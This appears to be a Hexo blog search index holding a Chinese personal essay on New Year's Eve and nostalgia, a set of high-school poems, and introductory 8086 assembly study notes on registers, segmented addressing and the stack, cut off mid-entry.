<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>我不希望最美好的事情都发生在过去</title>
      <link href="/2024/02/09/%E6%88%91%E4%B8%8D%E5%B8%8C%E6%9C%9B%E6%9C%80%E7%BE%8E%E5%A5%BD%E7%9A%84%E4%BA%8B%E6%83%85%E9%83%BD%E5%8F%91%E7%94%9F%E5%9C%A8%E8%BF%87%E5%8E%BB/"/>
      <url>/2024/02/09/%E6%88%91%E4%B8%8D%E5%B8%8C%E6%9C%9B%E6%9C%80%E7%BE%8E%E5%A5%BD%E7%9A%84%E4%BA%8B%E6%83%85%E9%83%BD%E5%8F%91%E7%94%9F%E5%9C%A8%E8%BF%87%E5%8E%BB/</url>
      
        <content type="html"><![CDATA[<p>又是一年除夕，回顾自高中以来的每一次除夕，好像都或多或少有着一些不太寻常的事情发生。高一跨年准点收到一封意义非凡的情书，高二除夕cj来我家找我，两个人在空无一人的街道上找宵夜，走了快两里路在一个很偏的地方遇见一个同样没回家看春晚的大叔卖烧烤，三个略显孤独的人坐在寒风中吃着烤串，有一句没一句的聊着家庭，过去，和未来。高三跨年那晚把自己锁在房间里一个人看完了整本《你当像鸟飞过你的山》，然后早早的睡去。大一的除夕呢，没啥印象了，好像还在忙着准备那年的期末考试。大二的除夕，一个人，在深圳，和TIM找了家风评不错的餐厅吃海鲜，然而并不是很好吃，沉默的吃完，沉默的离开，回到出租屋，手机里是各种人发来的消息，祝福，红包。又认识了很多人，也忘记了很多人。</p><p>未来未来，我已经走在一条歧路上又何谈未来呢。一直以来长久的吸引我的只有文字。我的生活我的感情时时刻刻收到它的影响。悲哀。如果当初没有选择这条路，现在我又在愁苦于什么呢。好像文字不能拯救我，它只能让我更加清醒，也更加悲哀。</p><p>最近那个名字又总是出现在我的脑子里面，一些曾经辉煌的睥睨一切的，全都不见了，yy在神化的那一段过往，而我也不再提起。言语上否定了曾经，行为却更加急不可耐的证明了一切。语言的边界可以决定思想的边界，而习惯更是无形中禁锢一个人的镣铐。一件可怕的事情是这两样我全占了。</p><p>一直以来支撑这我前行的动力在于：我不希望最美好的事情都发生在过去。但现在却迷茫了，当我发现我回忆过去怀念过去，日复一日无法自拔的时候，的确是狠狠的迷茫了。经历的越多，梦就越破碎一分。</p><p>过去。我始终不明白记忆对人而言到底意味着什么。我在一些时刻近乎疯狂的保留我写的每一份文字，在我能想得到任何的地方给它们备份，又千方百计地阻止任何一个外人看到它们。我时常觉得守住了他们就守住了代表我一部分生命的过去，这样我活着的重量就又加重一分。可是同样我又悲哀的发现人能记住的东西的总量大约是守恒的。好吧，至少我还是一直流动的。</p><p>仔细一想，好像有大约不超过二十个词，就能完完全全概括我现在的生活和我的文字。这二十个词就像一条很细很细的绳子，牢牢地禁锢住了我的灵魂。哈哈，可笑的是我好像并没有想要逃出来甚至越陷越深，深入到肉里，到骨髓里，我还在一边痛着一边为这勒痕赋诗。好吧，如果我坚持写诗的话我会很早就发现这一点的，可是我连诗歌也差不多抛弃掉了。。</p><p>Fine，人总是渴望蜕变又不屑于经验的。抛弃了任何事物与它的对立面，总是还有一条生命线在流动吧。</p>]]></content>
      
      
      <categories>
          
          <category> 文学 </category>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>asphyxia_0</title>
      <link href="/2024/01/16/asphyxia-0/"/>
      <url>/2024/01/16/asphyxia-0/</url>
      
        <content type="html"><![CDATA[<p>收录高中写的一些小诗</p><hr><blockquote><p>空荡的湖面，</p><p>潦漫的雾光，</p><p>我在舟中彷徨。</p><p>静静地等，</p><p>一场不寻常的日出，</p><p>或是一只记忆中的蝴蝶。</p><p>但我明白，</p><p>湖心处是寸草不生的，</p><p>贫瘠之岛。</p></blockquote><blockquote><p>空荡的湖面，</p><p>潦漫的雾光，</p><p>我在舟中彷徨。</p><p>问问湖神，</p><p>何处可通往爱情之海？</p><p>沉默，绝望的沉默。</p><p>千万颗水珠静止与脚下。</p><p>“什么是爱情？</p><p>我只知冬日冰冻的鱼和夏日喷涌的卵。”</p></blockquote><blockquote><p>空荡的湖面，</p><p>潦漫的雾光，</p><p>我在舟中彷徨。</p><p>看看天空，</p><p>期待明日漫天的飞雪。</p><p>问问小鸟，</p><p>西边的森林可有极光？</p><p>它振振双翅，</p><p>东边的原野里有一树樱桃。</p></blockquote><hr><hr><blockquote><p>快乐的人无法褪去烦闷的外衣，</p><p>痛苦的人心中激起阵阵烦闷的涟漪。</p><p>烦闷。</p><p>为什么渔樵热忱与垂钓，</p><p>为什么农夫只知歌唱。</p><p>穿上新衣时我畏惧阳光，</p><p>赤身游泳时我害怕死亡。</p><p>树才应该是花的影。</p></blockquote><blockquote><p>假如，我是说假如。</p><p>花儿爱上了蟋蟀，</p><p>它只是学会了张望，</p><p>张开双臂任蜜蜂肆虐，</p><p>它只是张望，</p><p>蟋蟀的眼中只有夏日的阳。</p><p>直到有一天，</p><p>夏蝉也会停止鸣叫。</p></blockquote><hr><hr><blockquote><p>看见光的同时必将看见永恒的黑</p><p>挣脱束缚的同时必将看见层层的枷锁</p><p>难以言喻的神秘有着致命的美感</p><p>其光芒照射出内心深处的丑态</p><p>既是追寻的丑态，</p><p>也是逃的丑态。</p><p>20210903</p></blockquote><hr><hr><blockquote><p>有一天，快要窒息的人们发现</p><p>原来自己被丢进了海里。</p><p>“必须找到一个袋子，</p><p>大到能装进所有的水”</p><p>人们一边想着一边挣扎。</p><p>上帝仿佛心生怜悯，</p><p>派来一只鸟刁来这袋子。</p><p>没有人接过它。</p><p>谁又有勇气，</p><p>面对一片干涸的狼藉？</p><p>20220321</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 文学 </category>
          
          <category> 诗 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 诗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言</title>
      <link href="/2024/01/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
      <url>/2024/01/15/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>【8086汇编入门】</p><h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>汇编课程的研究重点放在如何利用硬件系统的编程结构和指令集有效的控制系统进行运作。</p><p>&#x3D;&#x3D;机器语言&#x3D;&#x3D;</p><p>机器语言是机器指令的集合。展开来说就是一台机器可以正确执行的命令</p><p>&#x3D;&#x3D;汇编语言&#x3D;&#x3D;</p><ul><li>汇编语言的主体是汇编指令</li><li>汇编指令和机器指令的差别在于指令的表示方法上，汇编指令是机器指令便于记忆的书写格式</li></ul><p>&#x3D;&#x3D;寄存器&#x3D;&#x3D;</p><p>寄存器简单来说就是CPU中可以存储数据的器件，一个CPU中有多个寄存器。</p><ul><li>CPU由运算器、控制器、寄存器等器件构成，这些器件靠片内总线相连。</li><li>运算器进行信息处理；控制器控制各种器件进行工作；寄存器进行<strong>信息存储</strong>；</li></ul><h3 id="汇编语言的组成"><a href="#汇编语言的组成" class="headerlink" title="汇编语言的组成"></a>汇编语言的组成</h3><p>汇编语言由一下三类组成：</p><ul><li>汇编指令(机器码的助记符)</li><li>伪指令(由编译器执行)</li><li>其他符号(由编译器识别，没有对用的机器码)</li></ul><p>汇编语言的核心是汇编指令，它决定了汇编语言的特性。</p><h3 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h3><p>CPU 是计算机的核心部件，控制计算机的运作并进行运算。指令和数据再存储器中存放，也就是平时说的内存</p><p>一台PC机中内存的作用仅次于CPU，离开了内存，CPU无法运作。而磁盘不同于内存，磁盘上的数据库程序如果不读到内存中，就无法被CPU使用。</p><ul><li>随机存储器（RAM）在程序的执行过程中可读可写，必须带电存储</li><li>只读存储器（ROM）在程序的执行过程中只读，关机数据不丢失</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231030133241106.png" alt="image-20231030133241106" style="zoom: 25%;" /><h3 id="指令和数据"><a href="#指令和数据" class="headerlink" title="指令和数据"></a>指令和数据</h3><ul><li>指令和数据是应用上的概念</li><li>在内存或磁盘上，指令和数据没有任何区别，都是二进制信息。</li></ul><h3 id="存储单元"><a href="#存储单元" class="headerlink" title="存储单元"></a>存储单元</h3><p>存储器被划分为若干个存储单元，每个存储单元从0开始编号</p><p>存储容量转换</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1KB = 1024B</span><br><span class="line">1MB = 1024KB</span><br><span class="line">1GB = 1024MB</span><br><span class="line">1TB = 1024GB</span><br></pre></td></tr></table></figure><h3 id="CPU对存储器的读写"><a href="#CPU对存储器的读写" class="headerlink" title="CPU对存储器的读写"></a>CPU对存储器的读写</h3><p>CPU要从内存中读取数据，首先要指定存储单元的地址。也就是它要确定读取哪一个存储单元的数据。</p><p>另外，在一台微机中，不只有存储器这一种器件，CPU在读写数据时还要指明，它要对哪一个器件进行操作。</p><p>还要确定进行的是那种操作，是从中读出数据，还是向里面写入数据。</p><p>可见，CPU要想进行数据的读写，必须和外部器件(标准的说法是芯片)进行三类信息的交互：</p><ul><li>存储单元的地址(地址信息)</li><li>器件的选择，读或写命令(控制信息)</li><li>读或写的数据(数据信息)</li></ul><p>CPU是通过什么将地址、数据和控制信息传到存储器芯片中的呢?计算机中专门有连接CPU和其他芯片的导线，称为总线。逻辑上分为三类：地址总线，控制总线和数据总线</p><h3 id="地址总线"><a href="#地址总线" class="headerlink" title="地址总线"></a>地址总线</h3><ul><li>CPU是通过地址总线指定存储单元的</li><li>地址总线上能传送多少个不同的信息，CPU就可以对多少和存储单元进行寻址<ul><li>一个CPU有N根地址总线，则可以说这个CPU的地址总线的宽度为N</li><li>这样的 CPU最多可以寻找2的N次方个内存单元</li></ul></li></ul><h3 id="数据总线"><a href="#数据总线" class="headerlink" title="数据总线"></a>数据总线</h3><ul><li>CPU与内存或其他器件之间的数据川总是通过数据总线来进行的</li><li>数据总线的宽度决定了CPU和外界的数据传送数据</li></ul><h3 id="控制总线"><a href="#控制总线" class="headerlink" title="控制总线"></a>控制总线</h3><ul><li>CPU对外部器件的控制是通过控制总线来进行的，在这里控制总线是一个总称，控制总线是一些不同控制线的集合</li><li>有多少根控制总线，就意味着CPU提供了对外部前进的多少种控制，控制总线的宽度决定了CPU对外部器件的控制能力</li></ul><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>汇编指令是机器指令的<strong>助记符</strong>，同机器指令一一对应</li><li>每一种CPU都有自己的汇编指令集</li><li>CPU可以直接使用的信息是在<strong>存储器</strong>中存放的</li><li>在存储器中指令和数据没有任何区别，都是二进制信息</li><li>一个CPU可以引出三种不同的总线的宽度标志了这个CPU的不同方面的性能<ul><li>地址总线的宽度决定了CPU的寻址能力</li><li>数据总线的宽度决定了CPU与其他器件进行数据传传送的一次数据传送量</li><li>控制总线宽度决定了CPU对系统中其他器件的控制能力</li></ul></li></ul><h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><h3 id="CPU内部工作原理"><a href="#CPU内部工作原理" class="headerlink" title="CPU内部工作原理"></a>CPU内部工作原理</h3><h5 id="CPU概述"><a href="#CPU概述" class="headerlink" title="CPU概述"></a>CPU概述</h5><p>一个典型的CPU由<strong>运算器，控制器，寄存器</strong>等器件组成，这些器件由内部总线相连。而第一章说的总线对于CPU来说是外部总线。</p><ul><li>内部总线实现CPU内部各个器件之间的联系</li><li>外部总线实现CPU和主板上其他器件的联系</li></ul><p>在CPU内部:</p><ul><li>运算器进行信息处理</li><li>寄存器进行信息存储</li><li>控制器控制着各种器件进行工作</li></ul><h5 id="寄存器概述"><a href="#寄存器概述" class="headerlink" title="寄存器概述"></a>寄存器概述</h5><p>8086CPU有14个寄存器，它们的名称为：</p><p>AX,BX,CX,DX,SI,DI,SP,BP,IP,CS,SS,DS,ES,PSW</p><h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p>[AX,BX,CX,DX]</p><ul><li><p>8086CPU所有的寄存器都是16位的，可以存放两个字节(一个字)</p><ul><li>为保持兼容性，这四个通用寄存器都可以分为两个独立的8位寄存器使用</li></ul></li><li><p>AX,BX,CX,DX通常用来存放一般性数据，被称为通用寄存器</p><ul><li>AX可以分为AH和AL(兼容性考虑)    其他三个同理</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231030135425947.png" alt="image-20231030135425947" style="zoom: 25%;" /></li></ul><p>16位结构CPU具有下面几方面的结构特性。</p><ul><li>运算器一次最多可以处理16位的数据；</li><li>寄存器的最大宽度为16位；</li><li>寄存器和运算器之间的通路为16位。</li></ul><h3 id="几条汇编指令"><a href="#几条汇编指令" class="headerlink" title="几条汇编指令"></a>几条汇编指令</h3><table><thead><tr><th align="center">汇编指令</th><th align="center">控制CPU完成的操作</th><th align="center">用高级语言的语法描述</th></tr></thead><tbody><tr><td align="center">mov ax , 18</td><td align="center">将18送入AX</td><td align="center">AX &#x3D; 18</td></tr><tr><td align="center">mov ah , 78</td><td align="center">将78送入AH</td><td align="center">AH &#x3D; 78</td></tr><tr><td align="center">add ah , 8</td><td align="center">将寄存器AX中的数值加8</td><td align="center">AX &#x3D; AX + 8</td></tr><tr><td align="center">mov ax , bx</td><td align="center">将寄存器BX中的数据送入AX</td><td align="center">AX &#x3D; BX</td></tr><tr><td align="center">add ax , bx</td><td align="center">将AX,BX中的内容相加，结果放在AX中</td><td align="center">AX &#x3D; AX + BX</td></tr></tbody></table><h5 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h5><ul><li>CPU访问内存单元时要给出内存单元的地址。所有的内存单元构成的存储空间是一个一维的线性空间</li><li>我们将这个唯一的地址称为物理地址</li></ul><h6 id="一个问题"><a href="#一个问题" class="headerlink" title="一个问题"></a>一个问题</h6><p>8086CPU有20位地址总线，可以传送20位地址，达到1MB寻址能力。<br>8086CPU又是16位结构，在内部一次性处理、传输、暂时存储的地址为16位。<br>从8086CPU的内部结构来看，如果将地址从内部简单地发出，那么它只能送出16位的地址，表现出的寻址能力只有64KB。</p><blockquote><p>8086CPU采用一种在内部用两个16位地址合成的方法来形成一个20位的物理地址</p></blockquote><ul><li>CPU中的相关部件提供两个16位的地址，一个称为段地址，另一个称为偏移地址；</li><li>地址加法器将两个16位地址合成为一个20位的物理地址；</li></ul><p>地址加法器合成物理地址的方法：</p><p><code>物理地址 = 段地址 × 16 + 偏移地址</code></p><p>其中<code>段地址× 16 </code>有一个更常用的说法就是数据左移4位，16进制的话就是左移1位。</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240111183554301.png" alt="image-20240111183554301" style="zoom:33%;" /><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><h5 id="段的概念"><a href="#段的概念" class="headerlink" title="段的概念"></a>段的概念</h5><p>内存并没有分段，段的划分来自于CPU，由于8086CPU用<code>物理地址 = 段地址 × 16 + 偏移地址</code>的方式给出内存单元的物理地址，使得我么可以用<strong>分段的方式来管理内存</strong>。</p><ul><li>段地址 × 16 必然是16的倍数，所以一个段的起始地址也一定是16的倍数</li><li>偏移地址为16位，16位地址的寻址能力为64kb，左移一个段的长度最大为64kb</li></ul><h6 id="段寄存器-1"><a href="#段寄存器-1" class="headerlink" title="段寄存器"></a>段寄存器</h6><p>段寄存器就是提供段地址的。8086CPU有4个段寄存器，<code>CS,DC,SS,ES</code>当8086CPU要访问内存是，由这4个段寄存器提供内存单元的段地址</p><h6 id="CS和IP"><a href="#CS和IP" class="headerlink" title="CS和IP"></a>CS和IP</h6><blockquote><p>CS和IP是8086CPU中最关键的寄存器，它们指示了CPU当前要读取指令的地址</p></blockquote><ul><li>CS为代码段寄存器</li><li>IP为指令指针寄存器</li></ul><p>CS为代码段寄存器，IP为指令指针寄存器，</p><p>CPU将CS、IP中的内容当作指令的段地址和偏移地址,用它们合成指令的物理地址,</p><p>CPU将CS : IP指向的内容当作指令执行。(即PC)</p><p>&#x3D;&#x3D;工作过程&#x3D;&#x3D;</p><ul><li>从CS:IP指向内存单元读取指令，读取的指令进入指令缓冲器。</li><li>IP &#x3D; IP + 读取的指令的长度，从而指向下一条指令。</li><li>执行指令，转到步骤1，重复这个过程。</li></ul><p>&#x3D;&#x3D;修改CS和IP的指令&#x3D;&#x3D;</p><ul><li><p>在CPU中，程序员能够用指令读写的部件只有寄存器，程序员可以通过改变寄存器中的内容实现对CPU的控制</p></li><li><p>CPU从何处执行指令是由CS、IP中的内容决定的，程序员通过改变CS、IP中的内容来控制CPU</p></li><li><p><code>MOV</code>指令可以改变8089CPU大部分寄存器的值，被称为传送指令，但是不能通过<code>MOV</code>指令改变CS、IP的值</p></li><li><p>8086提供了专门的转移指令来修改CS、IP的值</p></li><li><p>同时修改CS、IP的内容：<br><code>jmp 段地址:偏移地址</code><br>jmp 2AE3:3        -&gt;     从2AE33H处读取指令<br>jmp 3:0B16        -&gt;     从00B46H处读取指令</p><p><strong>功能：用指令中给出的段地址修改CS，偏移地址修改IP</strong></p></li><li><p>仅修改IP的内容</p><p><code>jmp 某一合法寄存器</code></p><p>jmp ax (类似于 mov IP，ax)</p><p>功能：用寄存器中的值修改IP</p></li></ul><h3 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h3><ul><li>对于8086CPU机，在编程时，可以根据需要，将一组内存单元定义为一个段</li><li>可以将长度为N的一组代码，存在一组地址连续、起始地址为16的倍数的内存单元中，这段内存是用来存放代码的，从而定义了一个代码段</li></ul><h1 id="寄存器-内存访问"><a href="#寄存器-内存访问" class="headerlink" title="寄存器(内存访问)"></a>寄存器(内存访问)</h1><h3 id="DS和-address"><a href="#DS和-address" class="headerlink" title="DS和[address]"></a>DS和[address]</h3><ul><li>CPU要读取一个内存单元的时候，必须先给出这个内存单元的地址</li><li>在8086CPU中，内存地址由段地址和偏移地址组成</li><li>8086CPU中有一个<strong>DS寄存器</strong>，通常用来存放要访问的数据的段地址</li></ul><p>例如：我们要读取10000H单元的内容可以用如下程序进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov bx,1000H</span><br><span class="line">mov ds,bx    ;为什么要转一次？8086不支持将数据直接送入段寄存器</span><br><span class="line">mov al, [0]    ;将10000H(1000:0)中的数据读到al中</span><br></pre></td></tr></table></figure><p>解释：</p><ul><li>前面已知mov指令可以将<strong>数据直接送入寄存器</strong>，或者<strong>将一个寄存器中的内容送入另一个寄存器</strong></li><li>除此之外，mov指令还可以将一个<strong>内存单元</strong>中的内容送入一个寄存器</li><li>格式：<code>mov 寄存器名,内存单元地址</code></li><li>[···]表示一个内存单元，“[···]”中的0表示内存单元的偏移地址</li><li>而CPU自动读取DS中的数据作为内存单元的段地址</li><li>此时，读取到的内存单元就是：DS:偏移地址</li></ul><h3 id="mov、add、sub指令"><a href="#mov、add、sub指令" class="headerlink" title="mov、add、sub指令"></a>mov、add、sub指令</h3><p>mov已学的几种指令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov 寄存器,数据     ;mov ax 8</span><br><span class="line">mov 寄存器,寄存器    ;mov ax,bx</span><br><span class="line">mov 寄存器,内存单元  ;mov ax,[0]  ;反过来也是可以的</span><br><span class="line">mov 段寄存器,寄存器  ;mov ds,ax   ;反过来也是可以的</span><br></pre></td></tr></table></figure><p>add和sub同mov一样，都有两个操作对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add 寄存器,数据       ;add ax,8</span><br><span class="line">add 寄存器,寄存器      ;add ax,bx</span><br><span class="line">add 寄存器,内存单元    ;add ax,[0]</span><br><span class="line">add 内存单元,寄存      ;add [0],ax</span><br></pre></td></tr></table></figure><h3 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h3><p>对于8086CPU，我们可以根据需要将一组内存单元定义为一个段(可以是代码段、数据段等)</p><p>我们可以将一组长度为N、地址连续、起始地址为16的倍数的内存单元当做专门存储数据的内存空间，从而定义了一个数据段。</p><p>比如用123B0H~123B9H这段空间来存放数据：</p><ul><li>段地址：123BH</li><li>长度：10字节</li></ul><blockquote><p>数据段的访问</p></blockquote><p>例如：将123B0H~123B9H的内存空间定义为数据段，并累加这个数据段中前三个单元中的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax,123BH</span><br><span class="line">mov ds,ax   ;定义数据段的段地址</span><br><span class="line">mov al,0   ;用al存放累加结果</span><br><span class="line">add al,[0]  ;为什么用al？用ax的话是16位，那么取[0]的数据(8位)的时候会自动加上高位一起</span><br><span class="line">add al,[1]</span><br><span class="line">add al,[2]</span><br></pre></td></tr></table></figure><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>特性：先进后出(LIFO)last in first out</p><p>8086CPU提供入栈和出栈的指令(最基本的)：[入栈和出栈的操作都是以字节为单位进行的]</p><p>PUSH (入栈)</p><p>​<code>push ax</code>  将寄存器ax中的数据送入栈中</p><p>POP (出栈) </p><p>​<code>pop ax</code>从栈顶去除数据送入ax。</p><p><strong>cpu如何知道当前要执行的指令所在的位置？</strong></p><p>答：寄存器CS和IP中存放着当前指令的段地址和偏移地址</p><p>8086CPU中，有两个寄存器：</p><ul><li>段寄存器SS存放栈顶的段地址</li><li>寄存器SP    存放栈顶的偏移地址</li></ul><p><code>任意时刻：SS:SP指向栈顶元素</code></p><p>&#x3D;&#x3D;pop指令的执行过程[push同理]&#x3D;&#x3D;</p><p><code>pop ax</code></p><ul><li>将SS:SP指向的内存单元处的数据送入ax中</li><li>SP&#x3D;SP+2[push的话就是SP-2]，SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231031135144429.png" alt="image-20231031135144429" style="zoom:25%;" /><h4 id="栈顶越界"><a href="#栈顶越界" class="headerlink" title="栈顶越界"></a>栈顶越界</h4><p>8086CPU的工作机理：只考虑当前的情况</p><ul><li>当前栈顶在何处</li><li>当前要执行的指令是那一条</li><li>CPU并不会知道栈顶在哪里    —&gt;    存在栈溢出的问题</li></ul><h4 id="push、pop"><a href="#push、pop" class="headerlink" title="push、pop"></a>push、pop</h4><p>&#x3D;&#x3D;push和pop指令的格式(1)&#x3D;&#x3D;</p><ul><li><code>push 寄存器</code>  将一个寄存器中的数据入栈         ;push ax</li><li><code>pop 寄存器</code>  出栈，用一个寄存器接收出栈的数据        ;pop bx</li></ul><p>&#x3D;&#x3D;push和pop指令的格式(2)&#x3D;&#x3D;</p><ul><li><code>push 段寄存器</code>  将一个段寄存器中的数据入栈        ;push ds</li><li><code>pop 段寄存器</code>出栈，用一个段寄存器接收出栈的数据          ;pop es</li></ul><p>&#x3D;&#x3D;push和pop指令的格式(3)&#x3D;&#x3D;</p><ul><li><code>push 内存单元</code>  将一个内存单元处的<strong>字</strong>入栈[栈操作都是以字为单位]        ;push [0]</li><li><code>pop 内存单元</code>出栈，用一个内存字单元接收出栈的数据       ;pop [2]</li></ul><p>指令实行时，CPU要知道内存单元的地址，可以在push，pop指令中给出内存单元的偏移地址，段地址在指令执行的手CPU从ds中取得</p><h5 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h5><p>将10000H~1000FH这段空间当做栈，初始状态是空的，设置AX&#x3D;002AH，BX&#x3D;002BH，利用栈，交换AX和BX中的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1000H</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,0010H        ;初始化栈顶SS:SP指向10010H</span><br><span class="line">mov ax,002AH          </span><br><span class="line">mov bx,002BH</span><br><span class="line">push ax             ;ax的值传进去002AH</span><br><span class="line">push bx             ;bx的值传入002BH</span><br><span class="line">pop ax              ;出栈,把栈顶数据002BH[原来ax的数据]传给ax</span><br><span class="line">pop bx              ;同上</span><br></pre></td></tr></table></figure><h4 id="栈段"><a href="#栈段" class="headerlink" title="栈段"></a>栈段</h4><p>我们可以将一组长度为N、地址连续、起始地址为16的倍数的内存单元当做栈来使用，从而定义了一个栈段。</p><h1 id="第一个程序"><a href="#第一个程序" class="headerlink" title="第一个程序"></a>第一个程序</h1><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>一个汇编语言程序从写出到最终执行的简要过程：</p><ul><li>编写    —&gt;    .asm</li><li>编译连接    —&gt;    对源程序文件中的源程序进行编译产生目标文件    —&gt;    .ogj    —&gt;    再用连接程序对目标文件进行连接，生成可执行文件    —&gt;    .exe<ul><li>可执行文件包含两个部分：<ul><li>程序(从源程序中的汇编指令翻译过来的机器码)和数据(源程序中定义的数据)</li><li>相关的描述信息(比如：程序的大小和占用的内存空间等)</li></ul></li></ul></li><li>执行    —&gt;    操作系统依照客户自行文件中的描述信息，将可执行文件中的机器码和数据加载入内存，并进行相关的初始化(比如：设置CS:IP指向第一条要执行的指令)，然后由CPU执行程序</li></ul><h3 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">;1.asm</span><br><span class="line">assume cs:codesg ;将用作代码段的段codesg和段寄存器cs联系起来。</span><br><span class="line"></span><br><span class="line">codesg segment ;定义一个段，段的名称为“codesg”，这个段从此开始</span><br><span class="line">   ;codesg是一个标号，作为一个段的名称，最终被编译连接成一个段的段地址</span><br><span class="line"></span><br><span class="line">mov ax, 0123H</span><br><span class="line">mov bx, 0456H </span><br><span class="line">add ax, bx</span><br><span class="line">add ax, ax </span><br><span class="line"></span><br><span class="line">mov ax, 4c00H </span><br><span class="line">int 21H ;这两条指令实现程序的返回</span><br><span class="line"></span><br><span class="line">codesg ends ;名称为“codesg”的段到此结束</span><br><span class="line"></span><br><span class="line">end ;编译器在编译汇编程序的过程中，碰到了伪指令end，结束对源程序的编译</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h4><p>在汇编语言源程序中，包含两种指令，一种是汇编指令，一种是。伪指令没有对应的机器码的指令，最终不被CPU执行。伪指令是由<strong>编译器</strong>来执行的指令，编译器根据伪指令来进行相关的编译工作。</p><p>&#x3D;&#x3D;定义一个段&#x3D;&#x3D;</p><ul><li>**<code>segment</code><strong>和</strong><code>ends</code>**是一对成对使用的伪指令，这是在写可以被编译器编译的汇编程序时，必须用到的一对伪指令</li><li><strong><code>segment</code><strong>和</strong><code>ends</code><strong>的功能是</strong>定义一个段</strong>，segment说明一个段的开始，ends说明一个段的结束</li><li>一个段必须有一个名称来标识，使用格式为：<ul><li><code>段名 segment</code></li><li><code>段名 ends</code></li></ul></li><li>一个汇编程序由多个段组成，这些段用来存放代码、数据或被当做栈空间使用。但是一个程序至少有一个段</li></ul><p>&#x3D;&#x3D;End&#x3D;&#x3D;</p><ul><li>End是一个汇编程序的结束标记，编译器在编译汇编程序的过程中，如果碰到了伪指令end，就结束对源程序的编译</li><li>注意不要搞混了end和ends。ends是和segment成对使用的标记一个段的结束，ends可以理解为<code>end segment</code></li></ul><p>&#x3D;&#x3D;assume&#x3D;&#x3D;</p><ul><li><code>assume</code>:含义为’假设’</li><li>它假设某一段寄存器和程序中的某一个用<code>segment···ends</code>定义的段相关联</li><li>通过<code>assume</code>说明这种关联，在需要的情况下，编译程序可以将带寄存器和某个具体的段相关联</li><li>assume并不是一条非要深入理解不可的伪指令，以后我们编程的时候，记得用特定用途的段和相关的段寄存器关联起来即可</li><li><code>assume cs:codesg </code>  将用作代码段的段codesg和段寄存器cs联系起来。</li></ul><h4 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h4><p>有对应的机器码的指令，可以被编译为机器指令，最终为CPU所执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov bx,0456H</span><br><span class="line">add ax,bx</span><br></pre></td></tr></table></figure><p>这些就是一些汇编指令，可以和机器指令一一对应</p><h4 id="标号"><a href="#标号" class="headerlink" 